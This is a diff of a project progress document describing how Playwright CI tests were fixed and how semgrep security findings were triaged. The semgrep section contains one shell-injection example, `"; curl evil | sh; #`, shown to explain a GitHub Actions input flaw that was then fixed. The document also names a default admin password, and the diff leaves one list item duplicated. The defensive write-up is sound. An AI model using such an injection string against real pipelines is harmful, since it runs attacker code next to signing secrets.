@@ -1600,9 +1600,52 @@ policy answers 403 + audit on `/oauth/authorize`.
    - **Phase 4 checked a console nobody was serving.**
    Verified locally against a real stack before the job was written:
    **17 checks, 17 passed.**
-3. ☐ **Playwright in CI** — the mocked specs against `vite preview`, the
-   backend-dependent ones inside the smoke job; port/README drift fixed;
-   stale specs fixed or deleted, never skipped.
+3. ✅ **Playwright in CI** — *shipped*, and the suite could not have passed
+   before it. **418 passed, 20 skipped, 0 failed** on chromium against a
+   real stack; the new `e2e` job runs all fifty spec files that way.
+   What had to be fixed first was not the specs:
+   - **Nothing ever signed in.** `playwright.config.ts` declared no `setup`
+     project and no `storageState`, and `.setup.ts` does not match
+     Playwright's default `testMatch` — so `auth.setup.ts` never ran and
+     every "authenticated" spec ran signed out. The specs that deliberately
+     want no session say so with
+     `test.use({ storageState: { cookies: [], origins: [] } })`, which only
+     makes sense against an authenticated default: the intent was there, the
+     wiring was not. The setup also typed `admin123`, which matches nothing
+     (the seeded admin is `Admin@123`), and waited five seconds for a
+     username field on a page that opens on a single "Sign in with OpenIDX"
+     button — the console **is** the login UI, so the form appears only
+     after `/oauth/authorize` mints a `login_session` and redirects back.
+     The setup now drives that flow.
+   - **The dev server could not reach the API.** `getAPIBaseURL()` fell
+     through to a hardcoded `http://localhost:8005` — admin-api — in dev and
+     for any build served from `:3000`. admin-api owns a slice of `/api/v1`;
+     identity, governance, audit, provisioning and access own the rest, so
+     the console sent its whole surface to one service and got 404 for
+     everything else. The login page's own "fetch identity providers" call
+     was one of them. It also meant Vite's proxy was never consulted: axios
+     had an absolute base, so nothing was relative enough to proxy. Dev is
+     now relative; a built bundle uses its own origin (in every documented
+     deployment the thing serving the SPA also fronts the API);
+     `VITE_API_URL` still overrides both.
+   - **That proxy was a stale subset** — identity, governance, provisioning,
+     audit and three admin-api paths spelled out one at a time. No
+     `/api/v1/access/*`, no `/oauth/*`, no catch-all. It now mirrors the
+     deployed edge route table, specific prefixes first and `/api/` last,
+     the same order APISIX's priorities give.
+   - **The port drift was real, and the config was the wrong half.** The
+     dev server bound 5173 while `e2e/README.md`, `OAUTH_LOGIN_URL` and the
+     seeded `admin-console` client's redirect URIs all say 3000 — so a
+     sign-in from the dev server ended at "redirect_uri not registered for
+     client". Vite now binds 3000 with `strictPort`, so a busy port fails
+     loudly instead of moving to 3001 and breaking the redirect URI in a way
+     that looks like a server bug.
+   - The three `test:e2e:*` scripts the README documented now exist, and
+     `PLAYWRIGHT_BASE_URL` — documented since the suite was written, ignored
+     by the config — is read.
+4. ☐ **Helm install proof** — a `kind` job runs `make helm-install --wait`
+   and asserts the migration Job completed, OPA is ready, the backup
+   CronJob and NetworkPolicies exist.
 4. ☐ **Helm install proof** — a `kind` job runs `make helm-install --wait`
    and asserts the migration Job completed, OPA is ready, the backup
    CronJob and NetworkPolicies exist.
@@ -1680,8 +1723,33 @@ policy answers 403 + audit on `/oauth/authorize`.
        WARNING and INFO still reach the SARIF; blocking on all three tiers
        on a codebase this size produces a gate nobody can clear, and a gate
        nobody can clear is how this job acquired `continue-on-error` in the
-       first place. **Not verified locally** — semgrep could not be
-       installed in the sandbox — so the first CI run is the triage.
+       first place.
+       **The triage happened in CI, because semgrep would not install in the
+       sandbox — and it took five commits to notice.** Security Scanning is a
+       separate workflow, so its checks are not in `status-check`'s `needs`;
+       every per-commit "CI green" reading here was reading `ci.yml`. That is
+       precisely the gap the maintainer action below names, seen from the
+       inside. **7 ERROR findings, two rules, all fixed rather than waived
+       wholesale:**
+       - `run-shell-injection` ×5, in `docs.yml` and
+         `windows-client-build.yml`. `${{ github.event.inputs.version }}` and
+         `${{ inputs.version }}` are text a user types into a
+         `workflow_dispatch` form, substituted by the expression engine
+         *before* the shell parses the script — so `"; curl evil | sh; #`
+         would run on the runner holding this repository's code-signing
+         secrets. Every one now arrives through `env:` and is read as a
+         quoted variable. Four more sites the rule did not flag
+         (`steps.ver.outputs.version`, which derives from that same input)
+         were fixed with them.
+       - `detected-bcrypt-hash` ×2 — the seeded default admin's hash, in
+         `internal/migrations/sql.go` and `migrations/010_seed_data.up.sql`.
+         Public by design: it is the documented first-run credential, the
+         setup gate holds the console until it is changed, and
+         `ValidateProduction()` refuses to start a production process that
+         still has it. Silenced at the line, by rule id, with that reasoning
+         in place — not by excluding the files, which would also stop
+         catching a real credential pasted into the same migration. Verified
+         by applying all 138 migrations to a fresh database afterwards.
      - **License compliance stays informational, and now says why**:
        `go-licenses` classifies by heuristic and misreads vendored and
        dual-licensed modules often enough that blocking would mean arguing
